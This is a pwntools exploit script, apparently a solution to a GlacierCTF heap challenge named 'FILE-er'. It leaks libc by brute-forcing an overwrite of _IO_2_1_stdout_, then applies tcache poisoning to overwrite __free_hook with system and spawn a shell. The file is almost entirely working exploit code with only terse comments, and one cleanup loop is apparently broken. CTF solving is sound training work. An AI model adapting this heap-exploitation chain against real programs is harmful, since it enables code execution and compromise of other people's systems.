from pwn import *

elf  = ELF("./FILE-er_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def add(idx, sz, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>',b'%d' % idx)
    p.sendlineafter(b'>',b'%d' % sz)
    p.sendafter(b'> ',b'%s' % data)

def edit(idx, data):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>',b'%d' % idx)
    p.sendafter(b'> ',b'%s' % data)

def delete(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>',b'%d' % idx)

# brute force 1/16 to get a perfect libc address leak from overwriting _IO_2_1_stdout_
while True:
    with context.local(log_level = 'error'):
        p = elf.process()
        # p = remote('172.17.0.2', 1337)

        # p = remote('pwn.glacierctf.com', 13376)
        try:
            # padding
            add(0, 0x70, b'padding')
            # this will overwrite size of index 0 & 1 (size index is 32 dword) into pointer heap of index 16
            # then ? obviously will overflow because the size/value of heap address is large than 0x18
            add(0, 0x18, b'A'*8)
            add(1, 0x18, b'A'*8)
            add(16, 0xffffffff+1, b'')
            add(15, 0x18, b'B'*8)

            # this will be overwritten
            add(3, 0x408, b'X'*8)
            add(4, 0x18, b'X'*8)
            # padding
            add(5, 0x18, b'X'*8)
            add(6, 0x18, b'X'*8)

            # this will overwrite index 16 then index 3 size
            edit(1, b'O'*0x18 +
                    # chunk 16 metadata
                    p64(0x21) +
                    # chunk 16 data
                    b'A'*0x18 +
                    # chunk 15 metadata
                    p64(0x21) +
                    # chunk 15 data
                    b'B'*0x18 +
                    # chunk 3 metadata
                    p64(0x431)
            )
            delete(3)
            add(0, 0x18, p16(0x36a0)) # this will point to _IO_2_1_stdout_
            add(16, 0xffffffff+1, b'')

            delete(4)
            delete(0)

            # payload to overwrite _IO_2_1_stdout_ for leaking libc address
            payload = p64(0x0fbad1800)  
            payload += b'\0' * 0x18 
            payload += b'\0'

            # overwrite last nibble main_arena address to _IO_2_1_stdout_ address
            edit(1, b'0'*0x18 +
                    # chunk 16 metadata
                    p64(0x21) +
                    # chunk 16 data
                    b'A'*0x18 +
                    # chunk 15 metadata
                    p64(0x21) +
                    b'B'*0x18 +
                    p64(0x21) +
                    b'\x00'*0x18 +
                    p64(0x21) +
                    p16(0x16a0)
            )
            delete(15)

            # overwrite heap pointer to heap chunk that have _IO_2_1_stdout_ address
            edit(1, b'0'*0x18 +
                    # chunk 16 metadata
                    p64(0x21) +
                    # chunk 16 data
                    b'A'*0x18 +
                    # chunk 15 metadata
                    p64(0x21) +
                    # chunk 15 data
                    p8(0xb0)
            )
            add(4, 0x18, b'X') # popping chunk from fastbin freelist
            add(0, 0x18, b'X') # popping chunk from fastbin freelist
            add(1, 0x18, p64(0x0fbad1800) + p64(0))
            add(16, 0xffffffff+1, b'')
            edit(1, payload)
            resp = p.recvline_contains(b'Success')
            if len(resp) > 8:
                print(resp)
                break
            else:
                raise Exception()
        except:
            print('.', end='')
            p.close()
            pass

# print(p.pid,resp)
leak_addr = u64(resp[8:resp.find(b'\x7f\x00')+1].ljust(8, b'\x00'))
libc.address = leak_addr - libc.sym['_IO_2_1_stdin_']
log.info(f'_IO_2_1_stdin_ leak @ 0x{leak_addr:x}')
log.info(f'libc base @ 0x{libc.address:x}')


for i in range(0x10, 0 -1):
    delete(i)

for i in range(50):
    print(i,end='-')
    add(0, 0x28, b'padding')

# overflow + uaf + tcache poison
add(0, 0x28, b'A'*8)
add(1, 0x28, b'B'*8)
add(2, 0x28, b'C'*8)
add(3, 0x28, b'/bin/sh\x00')
add(16, 0xffffffff+1, b'')
delete(0)
delete(2)
edit(1, b'X'*0x28 +
        p64(0x31) +
        p64(libc.sym['__free_hook'])
)
add(2, 0x28, b'X') # popping chunk from fastbin freelist
add(0, 0x28, p64(libc.sym['system'])) # overwrite __free_hook to system
delete(3)   # spawn shell
# edit(0, b'AAAA')
p.interactive()